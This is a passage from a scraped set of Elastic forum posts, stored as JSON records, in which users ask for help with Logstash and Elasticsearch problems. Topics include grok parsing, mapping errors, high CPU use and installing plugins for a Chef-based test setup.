[.management-beats] [2020-04-08T00:56:43,066][ERROR][o.e.x.m.c.i.IndexRecoveryCollector] [94977] collector [index_recovery] timed out when collecting data [2020-04-08T00:56:53,066][ERROR][o.e.x.m.c.i.IndexStatsCollector] [94977] collector [index-stats] timed out when collecting data [2020-04-08T02:00:00,444][INFO ][o.e.c.m.MetaDataCreateIndexService] [94977] [apic-2020.04.08] creating index, cause [auto(bulk api)], templates [controlapic logs], shards [5]/[1], mappings [_doc] [2020-04-08T02:00:00,600][INFO ][o.e.c.m.MetaDataMappingService] [94977] [apic-2020.04.08/w1DNEzD4RgCs8YHPwkbDWw] update_mapping [_doc] Requesting you to take a look at this and help us in identifying the issue and fix it. Regards, Vibin",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2bb245b8-6a79-4f20-9b6b-8ce7da8b3a94",
    "url": "https://discuss.elastic.co/t/logstash-got-response-code-405-contacting-elasticsearch/228723",
    "title": "Logstash: Got response code '405' contacting Elasticsearch",
    "category": [
      "Logstash"
    ],
    "author": "tom55",
    "date": "April 19, 2020, 11:02am April 20, 2020, 1:40am April 20, 2020, 9:24am April 21, 2020, 12:28am April 21, 2020, 7:10am April 22, 2020, 3:06am April 22, 2020, 7:24am",
    "body": "When trying to connect Logstash to ElasticSearch I'm getting this error and I don't understand why. The error mentions a \"dead ES instance\" but ElasticSearch is running and I'm able to access the API with curl from the server. Config : Debian 9 Thanks",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "23038609-8095-4e6b-8e9a-e229425969c6",
    "url": "https://discuss.elastic.co/t/logstash-monitoring-api-with-https/229023",
    "title": "Logstash Monitoring API with HTTPS",
    "category": [
      "Logstash"
    ],
    "author": "jgato",
    "date": "April 21, 2020, 11:07am April 21, 2020, 3:13pm April 22, 2020, 7:07am",
    "body": "Hi there, I am trying to enable HTTPS for monitoring API. To ency this kind of requests curl -XGET 'localhost:9600/_node/pipelines?pretty' Other option, would be to disable this API? which APIS exposes Logstash by default? In the configuration I have disabled monitoring, but still is there: xpack.monitoring.enabled: false many thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2627e075-3b3f-4516-86e9-042a34b18687",
    "url": "https://discuss.elastic.co/t/elasticsearch-input-query-with-sorting/229178",
    "title": "Elasticsearch input query with sorting",
    "category": [
      "Logstash"
    ],
    "author": "karnamonkster",
    "date": "April 22, 2020, 5:54am",
    "body": "Hi , On dev tools i am able to see the query working and fetching results as expected. GET index/_search { \"query\": { \"query_string\": { \"query\": \"FT52402\" } }, \"sort\": [ { \"@timestamp\": { \"order\": \"desc\" } } ] } However, in logstash elasticsearch input for , this does not produces any records. May be something silly has changed. query => '{ \"query\": {\"query_string\": { \"query\": \"FT52402\" } }, \"sort\": [{ \"@timestamp\": { \"order\": \"desc\" } } ]}'",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "39f90e1a-a697-4bd9-a6c0-ec8c54033f7c",
    "url": "https://discuss.elastic.co/t/logstash-keeps-regenerating-last-event/229051",
    "title": "Logstash keeps regenerating last event",
    "category": [
      "Logstash"
    ],
    "author": "ranadion",
    "date": "April 22, 2020, 5:37am",
    "body": "Hello everyone. I'm new to Elastic stak and I'm having some issues with my logstash pipeline. I have the following code: input { beats { id => \"data-collector-filebeat-input\" port => 5044 add_field => {\"application\" => \"data-collector\"} } } filter { if [application] == \"data-collector\" { mutate { id => \"data-collector-remove-fileds\" remove_field => [\"agent\", \"ecs\", \"@version\", \"host\", \"log\", \"tags\", \"input\", \"container\"] rename => { \"@timestamp\" => \"processTime\" } } json { id => \"data-collector-get-message\" source => \"message\" remove_field => [\"message\"] } date { id => \"data-collector-parse-start-date\" match => [\"date_start\", \"YYYY/MM/dd HH:mm:ss\"] } } } output { if [application] == \"data-collector\" { stdout { id => \"data-collector-stdout\" #codec => json_lines } elasticsearch { id => \"data-collector-save-to-elasticsearch\" index => \"data-%{+YYYY.MM.dd}\" template_name => \"data\" template => \"/opt/elk/logstash/logstash-7.5.2/templates/data.json\" } } } I send a message using filebeat input, after some time without sending new messages logstash keeps duplicating the last message and so writting to elasticsearch. I'm using logstash 7.5.2 and Filebeat 7.5.2 as well. Has anyone know what am I doing wrong? Thanks you a lot [EDIT] I'm adding some more information I've been doing some more investigation and I'm going to give more detail. I'm using logstash 7.5.2 and Filebeat 7.5.2 both installed using \".tar.gz\" files in a CentOS 7 operating system. When running directly both systems everything seems to work fine, this problem starts when I manually create both services (for filebeat and logstash) using \"systemctl\". To be more precise my handly created service for logstash is the one causing the problem. Now muy question is: Is it recommended to install Filebeat and Logstash using repository packages and \".tar.gz\" ones are to be used just for development propose? Thanks you a lot",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "074c2270-94e1-4191-af0d-8f186154ef85",
    "url": "https://discuss.elastic.co/t/scalability-of-logstash-when-using-path-path-to-file-test-log/229143",
    "title": "Scalability of Logstash when using path => \"/path/to/file/*/*/*/*/*/test.log\"",
    "category": [
      "Logstash"
    ],
    "author": "david4",
    "date": "April 22, 2020, 12:03am April 22, 2020, 2:37am",
    "body": "Hello, I'm new to the ELK stack and trying to write a Logstash configuration file to monitor a dynamic file structure. I already have two approaches that work, but really want to learn which is a better way. Approach 1: input { file { path => \"/tasks/**/**/**/**/**/test.log\" } } Approach 2 (with the help of a Logstash feature, reloading the config file): input { file { path => \"/tasks/2020/July/31/23/59/task1/test.log\" } } Basically, there is only one test.log (produced by a task like in the second example) that needs to be parsed by Logstash at any given time (Logstash shouldn't listen to the old logs such as from task0 anymore), but since the file structure in between keeps changing, I'm not sure if approach 1 can scale when there are millions tasks coming. For the second approach, I'm lucky to come across a Logstash feature that allows me to reload the config file every time there is a new test.log so Logstash doesn't need to listen to the old logs anymore). For example, I can change path => \"/tasks/2020/July/31/23/59/task1/test.log\" to path => \"/tasks/2021/August/21/23/59/task1000/test.log\" if I want. Questions: Which approach do you think will work better in my situation ? Or can you explain me how Logstash file input plugin works when I use a pattern like \"/tasks/**/**/**/**/**/test.log\" ? Does it search every second ? Does keeping track of the old logs that would never be updated again affect the performance of Logstash ? Thank you very much !!!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "055067b7-5aef-4b07-b2ab-cc7ebf39cd88",
    "url": "https://discuss.elastic.co/t/logstash-service-using-almost-200-cpu/229154",
    "title": "Logstash service using almost 200% CPU",
    "category": [
      "Logstash"
    ],
    "author": "jai.waghela",
    "date": "April 22, 2020, 1:55am April 22, 2020, 1:34am April 22, 2020, 1:48am April 22, 2020, 1:50am April 22, 2020, 1:52am April 22, 2020, 1:53am April 22, 2020, 1:56am April 22, 2020, 2:00am",
    "body": "Hi, The logstash service is constantly consuming high CPU above 150%. Below is the error but not sure what to do. PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 32381 logstash 39 19 6650912 283140 17616 S 190.7 2.3 0:06.39 java 1041 kibana 20 0 1267528 76520 10056 R 0.7 0.6 1835:10 node Error : [2020-04-22T05:22:21,076][INFO ][logstash.modules.scaffold] Initializing module {:module_name=>\"netflow\", :directory=>\"/usr/share/logstash/modules/netflow/configuration\"} [2020-04-22T05:22:21,078][DEBUG][logstash.plugins.registry] Adding plugin to the registry {:name=>\"netflow\", :type=>:modules, :class=>#<LogStash::Modules::Scaffold:0x7362835d @kibana_version_parts=[\"5\", \"6\", \"0\"], @module_name=\"netflow\", @directory=\"/usr/share/logstash/modules/netflow/configuration\">} [2020-04-22T05:22:21,079][INFO ][logstash.modules.scaffold] Initializing module {:module_name=>\"fb_apache\", :directory=>\"/usr/share/logstash/modules/fb_apache/configuration\"} [2020-04-22T05:22:21,079][DEBUG][logstash.plugins.registry] Adding plugin to the registry {:name=>\"fb_apache\", :type=>:modules, :class=>#<LogStash::Modules::Scaffold:0x66429216 @kibana_version_parts=[\"5\", \"6\", \"0\"], @module_name=\"fb_apache\", @directory=\"/usr/share/logstash/modules/fb_apache/configuration\">} [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] -------- Logstash Settings (* means modified) --------- [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] node.name: \"dfmel1log01\" [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] *path.config: \"/usr/share/logstash/config\" [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] path.data: \"/usr/share/logstash/data\" [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] modules.cli: [] [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] modules: [] [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] modules_setup: false [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] config.test_and_exit: false [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] config.reload.automatic: false [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] config.support_escapes: false [2020-04-22T05:22:21,090][DEBUG][logstash.runner ] config.reload.interval: 3 [2020-04-22T05:22:21,091][DEBUG][logstash.runner ] metric.collect: true [2020-04-22T05:22:21,091][DEBUG][logstash.runner ] pipeline.id: \"main\" [2020-04-22T05:22:21,091][DEBUG][logstash.runner ] pipeline.system: false [2020-04-22T05:22:21,091][DEBUG][logstash.runner ] pipeline.workers: 2 [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] pipeline.output.workers: 1 [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] pipeline.batch.size: 125 [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] pipeline.batch.delay: 5 [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] pipeline.unsafe_shutdown: false [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] path.plugins: [] [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] *config.debug: true (default: false) [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] *log.level: \"debug\" (default: \"info\") [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] version: false [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] help: false [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] log.format: \"plain\" [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] http.host: \"127.0.0.1\" [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] http.port: 9600..9700 [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] http.environment: \"production\" [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] queue.type: \"memory\" [2020-04-22T05:22:21,092][DEBUG][logstash.runner ] queue.drain: false [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] queue.page_capacity: 262144000 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] queue.max_bytes: 1073741824 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] queue.max_events: 0 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] queue.checkpoint.acks: 1024 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] queue.checkpoint.writes: 1024 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] queue.checkpoint.interval: 1000 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] dead_letter_queue.enable: false [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] dead_letter_queue.max_bytes: 1073741824 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] slowlog.threshold.warn: -1 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] slowlog.threshold.info: -1 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] slowlog.threshold.debug: -1 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] slowlog.threshold.trace: -1 [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] path.queue: \"/usr/share/logstash/data/queue\" [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] path.dead_letter_queue: \"/usr/share/logstash/data/dead_letter_queue\" [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] *path.settings: \"/etc/logstash\" (default: \"/usr/share/logstash/config\") [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] *path.logs: \"/var/log/logstash\" (default: \"/usr/share/logstash/logs\") [2020-04-22T05:22:21,093][DEBUG][logstash.runner ] --------------- Logstash Settings ------------------- [2020-04-22T05:22:21,100][FATAL][logstash.runner ] An unexpected error occurred! {:error=>java.nio.file.AccessDeniedException: /usr/share/logstash/data/.lock, :backtrace=>[\"sun.nio.fs.UnixException.translateToIOException(sun/nio/fs/UnixException.java:84)\", \"sun.nio.fs.UnixException.rethrowAsIOException(sun/nio/fs/UnixException.java:102)\", \"sun.nio.fs.UnixException.rethrowAsIOException(sun/nio/fs/UnixException.java:107)\", \"sun.nio.fs.UnixFileSystemProvider.newFileChannel(sun/nio/fs/UnixFileSystemProvider.java:177)\", \"java.nio.channels.FileChannel.open(java/nio/channels/FileChannel.java:287)\", \"java.nio.channels.FileChannel.open(java/nio/channels/FileChannel.java:335)\", \"org.logstash.FileLockFactory.obtainLock(org/logstash/FileLockFactory.java:84)\", \"java.lang.reflect.Method.invoke(java/lang/reflect/Method.java:498)\", \"RUBY.execute(/usr/share/logstash/logstash-core/lib/logstash/runner.rb:309)\", \"RUBY.run(/usr/share/logstash/vendor/bundle/jruby/1.9/gems/clamp-0.6.5/lib/clamp/command.rb:67)\", \"RUBY.run(/usr/share/logstash/logstash-core/lib/logstash/runner.rb:204)\", \"RUBY.run(/usr/share/logstash/vendor/bundle/jruby/1.9/gems/clamp-0.6.5/lib/clamp/command.rb:132)\", \"usr.share.logstash.lib.bootstrap.environment.(root)(/usr/share/logstash/lib/bootstrap/environment.rb:71)\", \"usr.share.logstash.lib.bootstrap.environment.(root)(usr/share/logstash/lib/bootstrap//usr/share/logstash/lib/bootstrap/environment.rb:71)\"]} root@dfmel1log01:/var/log/logstash#`Preformatted text`",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "1b4c03d9-81c0-474d-8702-974758228f1e",
    "url": "https://discuss.elastic.co/t/tried-to-parse-field-as-object-but-found-a-concrete-value/229134",
    "title": "Tried to parse field as object, but found a concrete value",
    "category": [
      "Logstash"
    ],
    "author": "Sirius",
    "date": "April 21, 2020, 10:22pm April 22, 2020, 12:04am April 22, 2020, 12:07am",
    "body": "Hi, I'm running filebeat 7.6.2 with logstash 7.5.1 having missing lines of logs in ES due this warning message ... [2020-04-21T21:25:21,105][WARN ][logstash.outputs.elasticsearch] Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"tableau_json_log_test-2020.04\", :routing=>nil, :_type=>\"_doc\"}, #LogStash::Event:0x2c15edaa], :response=>{\"index\"=>{\"_index\"=>\"tableau_json_log_test-2020.04\", \"_type\"=>\"_doc\", \"_id\"=>\"W_OhnnEBf8OpJ0AbkmlE\", \"status\"=>400, \"error\"=>{\"type\"=>\"mapper_parsing_exception\", \"reason\"=>\"object mapping for [v] tried to parse field [v] as object, but found a concrete value\"}}}} Data sample below it works with line #1 for [v] field structure but no for the #2,, any idea/advise how can I handle when [v] as an object ? #1 : {\"ts\":\"2020-03-17T00:00:48.950\",\"pid\":18640,\"tid\":\"6540\",\"sev\":\"info\",\"req\":\"-\",\"sess\":\"-\",\"site\":\"-\",\"user\":\"-\",\"k\":\"rotate-log\",\"v\":{\"new-path\":\"D:\\Tableau\\Tableau Server\\data\\tabsvc\\logs\\vizqlserver\\nativeapi_vizqlserver_9-2_2020_03_17_00_00_00.txt\",\"old-path\":\"D:\\Tableau\\Tableau Server\\data\\tabsvc\\logs\\vizqlserver\\nativeapi_vizqlserver_9-2_2020_03_16_00_00_00.txt\"}} #2 : {\"ts\":\"2020-03-17T00:00:48.949\",\"pid\":18640,\"tid\":\"5cb0\",\"sev\":\"info\",\"req\":\"-\",\"sess\":\"-\",\"site\":\"-\",\"user\":\"-\",\"k\":\"msg\",\"v\":\"ModelCacheInvalidator notifying dirty model for InvalidatorId=4270\"} I'm using these properties in my input filebeat to read json log files, the rest configuration is the default one. json.keys_under_root: true json.add_error_key: true json.message_key: log logstash configuration is: input { beats { port => 5040 ssl => true ssl_key => '..../logstash-test.pkcs8.key' ssl_certificate => '..../logstash-test.crt' } } output { if [fields][log_type] == \"tableau_json_log_test\" { elasticsearch { hosts => [\"https://test1.com:9200\",\"https://test2.com:9200\",\"https://test3.com:9200\"] index => \"tableau_json_log_test-%{+YYYY.MM}\" ssl => true ssl_certificate_verification => true cacert => '.../ca.crt' user => 'usr' password => 'passwd' } } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4910820f-d627-42ab-8fa7-228e2b4b9512",
    "url": "https://discuss.elastic.co/t/grok-filter-is-not-working-properly/229073",
    "title": "Grok filter is not working properly",
    "category": [
      "Logstash"
    ],
    "author": "Ankit-github-26",
    "date": "April 21, 2020, 3:03pm April 21, 2020, 3:55pm April 21, 2020, 4:24pm April 21, 2020, 6:39pm April 21, 2020, 6:57pm April 21, 2020, 9:26pm April 21, 2020, 9:33pm April 21, 2020, 9:35pm April 21, 2020, 9:38pm April 21, 2020, 9:43pm",
    "body": "Hello Guys, I have Filebeat-7.1 installed in a Debian server, this Filebeat send data from files in this Debian server to server with Logstash 7.6 , here are the files config Filebeat.yml: #=========================== Filebeat inputs ============================= filebeat.inputs: type: log Change to true to enable this input configuration. enabled: true paths: /root/code/cigol/logs/server.log json.keys_under_root: true json.overwrite_keys: true json.add_error_key: true force_close_files: true fields: env: dev type: voiceserver.log type: log enabled: true paths: - /usr/local/freeswitch/log/freeswitch.log force_close_files: true fields: env: dev type: freeswitch.log processors: drop_fields: fields: [\"agent.ephemeral_id\", \"time\", \"agent.hostname\", \"agent.id\", \"agent.type\", \"agent.version\", \"ecs.version\", \"input.type\", \"log.offset\", \"@version\", \"fields.env\", \"tags\"] #----------------------------- Logstash output -------------------------------- output.logstash: hosts: [\"35.171.202.75:5044\"] --------------------------------logstash.conf----------------------------------------------------------------------------- input.conf input { beats { port => 5044 } } filter.conf filter{ if [fields][env] == \"dev\" { if [source] == \"/root/code/cigol/logs/server.log\" { json { source => \"message\" } } } else if [source] == \"/usr/local/freeswitch/log/freeswitch.log\" { grok { match => { \"message\" => \"%{NOTSPACE:uuid} %{TIMESTAMP_ISO8601:date} [%{LOGLEVEL:loglevel}] %{GREEDYDATA:message}\" } remove_field => [\"message\"] } } } Output.conf output { elasticsearch { hosts => [\"127.0.0.1:9200\"] index => \"%{[fields][type]}-%{+YYYY.MM.dd}\" } stdout { codec => rubydebug } } application logs format 79110982-6d35-4b80-9be7-6ec9772313f9 2020-04-21 14:25:55.001130 [DEBUG] switch_core_state_machine.c:749 (sofia/3clogic_external/3001@freeswitch-registrar-10x.i3clogic.com:5505) State DESTROY Kibana Output message 79110982-6d35-4b80-9be7-6ec9772313f9 2020-04-21 14:25:55.001130 [DEBUG] mod_sofia.c:364 sofia/3clogic_external/3001@freeswitch-registrar-10x.i3clogic.com:5505 SOFIA DESTROY I want to segregate message as below \"UUID\" = 79110982-6d35-4b80-9be7-6ec9772313f9 \"date\" = 2020-04-21 14:25:55.001130 \"loglevel\" = DEBUG \"message\" = switch_core_state_machine.c:749 (sofia/3clogic_external/3001@freeswitch-registrar-10x.i3clogic.com:5505) State DESTROY Please help me on this",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "353180c9-848f-4263-8688-d998826cdb3e",
    "url": "https://discuss.elastic.co/t/installing-logstash-plugin-for-chef-spec/226541",
    "title": "Installing Logstash plugin for Chef spec",
    "category": [
      "Logstash"
    ],
    "author": "meowtochondria",
    "date": "April 4, 2020, 10:21pm April 21, 2020, 9:27pm",
    "body": "I am trying to setup tests for Logstash filters. We use Chef, and are having trouble installing plugins for our filters. Here's the spec file that sets up and run the tests. Tests are described in a YAML file, which I don't think are relevant to this question... because we are not even reaching that step. # frozen_string_literal: true require_relative '../spec_helper' describe 'logstash::events' do FILTER_VERIFIER_VERSION = '1.6.0' LOGSTASH_VERSION = '6.6.2' LOGSTASH_RUBY_VERSION = '2.3.0' cached(:chef_run) do ChefSpec::SoloRunner.new(platform: 'ubuntu', version: '16.04') do |runner| runner.node.set['consul']['server'] = 'true' runner.node.set['base_environment'] = 'chefspec' runner.node.set['logstash']['events']['type_mapping'] = { 'default-es-cluster' => 'mock-elastic-search-cluster', } runner.node.set['logstash-testing']['es_cluster_map'] = { 'mock-elastic-search-cluster' => '\"127.0.0.19:9200\"', } runner.node.set['logstash']['events']['default_es_cluster'] = 'mock-elastic-search-cluster' runner.node.set['consul']['config_dir'] = '/mnt/consul/config' runner.node.set['envoy']['listeners_log_path'] = '/mnt/envoy/listeners.log' # We're using a relative path, because we can't declare a property that lazily evaluates the @temp_dir. runner.node.set['maxmind']['db']['city_file'] = \"logstash-#{LOGSTASH_VERSION}/vendor/bundle/jruby/#{LOGSTASH_RUBY_VERSION}/gems/logstash-filter-geoip-5.0.3-java/vendor/GeoLite2-City.mmdb\" end.converge(described_recipe) end before(:all) do @temp_dir = Dir.mktmpdir # DEBUG # @temp_dir = '/tmp/d20200403-29347-rjfl7n' # Install the test software. unless system(\"wget 'https://github.com/magnusbaeck/logstash-filter-verifier/releases/download/#{FILTER_VERIFIER_VERSION}/logstash-filter-verifier_#{FILTER_VERIFIER_VERSION}_linux_amd64.tar.gz' -O - | tar zx\", chdir: @temp_dir) raise 'unable to download logstash-filter-verifier code' end # Download and extract logstash. puts \"Downloading and extracting Logstash version #{LOGSTASH_VERSION}...\" unless system(\"curl -s https://artifacts.elastic.co/downloads/logstash/logstash-#{LOGSTASH_VERSION}.tar.gz | tar zx\", chdir: @temp_dir) raise 'unable to download logstash' end # Download and install logstash plugins logstash_plugins = { 'logstash-codec-protobuf' => '1.1.0', 'logstash-filter-kv' => '4.2.1', 'logstash-input-cloudwatch_logs' => '1.0.3', 'logstash-filter-age' => '1.0.2' } logstash_directory = \"#{@temp_dir}/logstash-#{LOGSTASH_VERSION}\" ENV['DEBUG'] = '1' ENV['LOGSTASH_HOME'] = logstash_directory ENV['JRUBY_HOME'] = \"#{logstash_directory}/vendor/jruby\" ENV['GEM_HOME'] = \"#{logstash_directory}/vendor/bundle/jruby/#{LOGSTASH_RUBY_VERSION}\" ENV['GEM_PATH'] = \"#{logstash_directory}/vendor/bundle/jruby/#{LOGSTASH_RUBY_VERSION}\" ENV['LS_GEM_PATH'] = ENV['GEM_PATH'] ENV['PATH'] = \"#{logstash_directory}/bin:#{logstash_directory}/vendor/jruby/bin:#{ENV['GEM_HOME']}/bin:#{ENV['PATH']}\" system(ENV, \"for f in $(grep --recursive --files-with-matches '/home/vagrant/projects/logstash/vendor/jruby/bin/jruby' #{logstash_directory}/*); do sed -i'' 's|/home/vagrant/projects/logstash|#{logstash_directory}|g' $f; done\") logstash_plugins.each do |plugin_name, plugin_version| puts \"Installing Logstash plugin #{plugin_name} (v#{plugin_version})...\" next if system(ENV, \"#{logstash_directory}/bin/logstash-plugin install --version #{plugin_version} #{plugin_name}\", chdir: @temp_dir) raise \"Unable to install plugin #{plugin_name} (v#{plugin_version})...\" end # Install slack patterns, because the filters need them. Dir.mkdir \"#{@temp_dir}/patterns\" FileUtils.cp(File.join(__dir__, '../../files/default/patterns'), \"#{@temp_dir}/patterns/patterns\") FileUtils.cp(File.join(__dir__, '../../files/default/patterns'), \"#{logstash_directory}/vendor/bundle/jruby/#{LOGSTASH_RUBY_VERSION}/gems/logstash-patterns-core-4.1.2/patterns/patterns\") end after(:all) do # DEBUG # FileUtils.remove_entry_secure @temp_dir unless @temp_dir.nil? end before do # Pretend everything is installed (because we're not testing installation). stub_command('/usr/bin/dpkg-query --status logstash | /bin/grep -P \"Status.+unpacked\"').and_return(true) stub_command(\"curl -s --max-time 5 -XGET 'localhost:9600/_node/plugins' | jq '.plugins[] | select(.name == \\\"logstash-codec-protobuf\\\" and .version == \\\"1.1.0\\\")' | grep -q logstash-codec-protobuf\").and_return(true) stub_command(\"curl -s --max-time 5 -XGET 'localhost:9600/_node/plugins' | jq '.plugins[] | select(.name == \\\"logstash-filter-kv\\\" and .version == \\\"4.2.1\\\")' | grep -q logstash-filter-kv\").and_return(true) stub_command(\"curl -s --max-time 5 -XGET 'localhost:9600/_node/plugins' | jq '.plugins[] | select(.name == \\\"logstash-input-cloudwatch_logs\\\" and .version == \\\"1.0.3\\\")' | grep -q logstash-input-cloudwatch_logs\").and_return(true) stub_command(\"curl -s --max-time 5 -XGET 'localhost:9600/_node/plugins' | jq '.plugins[] | select(.name == \\\"logstash-filter-age\\\" and .version == \\\"1.0.2\\\")' | grep -q logstash-filter-age\").and_return(true) stub_command(\"curl -s --max-time 5 -XGET 'localhost:9600/_node/plugins' | jq .plugins[].name | grep -q logstash-codec-protobuf\").and_return(true) stub_command(\"curl -s --max-time 5 -XGET 'localhost:9600/_node/plugins' | jq .plugins[].name | grep -q logstash-filter-kv\").and_return(true) stub_command(\"curl -s --max-time 5 -XGET 'localhost:9600/_node/plugins' | jq .plugins[].name | grep -q logstash-input-cloudwatch_logs\").and_return(true) stub_command(\"curl -s --max-time 5 -XGET 'localhost:9600/_node/plugins' | jq .plugins[].name | grep -q logstash-filter-age\").and_return(true) end let(:tests) { Dir[File.join(__dir__, '*.yaml')] } it 'passes the filter tests' do expect(chef_run).to render_file('/etc/logstash/conf.d/events.conf').with_content { |content| # Create the config in our temporary directory. File.write(\"#{@temp_dir}/events.conf\", content) # Use this file to invoke the tests. unless system(\"#{@temp_dir}/logstash-filter-verifier\", \"--logstash-path=#{@temp_dir}/logstash-#{LOGSTASH_VERSION}/bin/logstash\", __dir__, \"#{@temp_dir}/events.conf\", chdir: @temp_dir) raise 'filter tests do not pass' end } end end I get the following exception: Installing Logstash plugin logstash-filter-age (v1.0.2)... Using GEM_HOME=/tmp/d20200403-29347-rjfl7n/logstash-6.6.2/vendor/bundle/jruby/2.3.0 Using GEM_PATH=/tmp/d20200403-29347-rjfl7n/logstash-6.6.2/vendor/bundle/jruby/2.3.0 DEBUG: exec /tmp/d20200403-29347-rjfl7n/logstash-6.6.2/vendor/jruby/bin/jruby /tmp/d20200403-29347-rjfl7n/logstash-6.6.2/lib/pluginmanager/main.rb install --version 1.0.2 logstash-filter-age Could not find rake-13.0.1 in any of the sources /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/spec_set.rb:86:in `block in materialize' org/jruby/RubyArray.java:2518:in `map!' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/spec_set.rb:80:in `materialize' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/definition.rb:170:in `specs' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/definition.rb:237:in `specs_for' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/definition.rb:226:in `requested_specs' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/runtime.rb:101:in `block in requested_specs' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/runtime.rb:20:in `setup' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler.rb:149:in `setup' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/setup.rb:10:in `block in (root)' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/ui/shell.rb:136:in `with_level' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/ui/shell.rb:88:in `silence' /home/meowtochondria/.rbenv/versions/2.4.1/lib/ruby/gems/2.4.0/gems/bundler-2.1.4/lib/bundler/setup.rb:10:in `<main>' org/jruby/RubyKernel.java:955:in `require' /tmp/d20200403-29347-rjfl7n/logstash-6.6.2/vendor/jruby/lib/ruby/stdlib/rubygems/core_ext/kernel_require.rb:1:in `(root)' Run `bundle install` to install missing gems. I verified that rake is available in JRuby's installation of Logstash. I have rbenv installed, which is providing ruby 2.4.1. Rake is installed there as well, but bundler is not able to find even that. I tried going through source code, but have not able to find any useful clues. Is there an environment variable or something that i can set to have installation proceed?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "29ab9198-935d-42cb-ad34-fb501dc75f6a",
    "url": "https://discuss.elastic.co/t/logstash-plugin-offline-packaging/229130",
    "title": "Logstash plugin offline packaging",
    "category": [
      "Logstash"
    ],
    "author": "granier",
    "date": "April 21, 2020, 9:01pm",
    "body": "Hi, I try to package a logstash plugin for offlline deployment. I use openjdk 10 2018-03-20 build 10+44 and logstash 6.8.3 that contains jruby jruby 9.2.7.0 (2.5.3) . I use the follonwing commands : logstash-plugin prepare-offline-pack --output plugin_jmx.zip --overwrite logstash-input-jmx logstash-plugin prepare-offline-pack --add-opens java.base/sun.nio.ch=org.jruby.core --output plugin_jmx.zip --overwrite logstash-input-jmx logstash-plugin prepare-offline-pack --add-opens java.base/sun.nio.ch=org.jruby.core --output plugin_jmx.zip --overwrite logstash-input-jmx I always get the same error : \"2020-04-21T22:49:49.110+02:00 [main] WARN FilenoUtil : Native subprocess control requires open access to sun.nio.ch Pass '--add-opens java.base/sun.nio.ch=org.jruby.dist' or '=org.jruby.core' to enable. ****\" How to solve a such issue ? B. Granier",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b193c377-420d-4e06-a48b-d942774ced02",
    "url": "https://discuss.elastic.co/t/fingerprint-to-get-the-last-out-of-user-agent/229120",
    "title": "Fingerprint to get the last out of user_agent",
    "category": [
      "Logstash"
    ],
    "author": "hispeed",
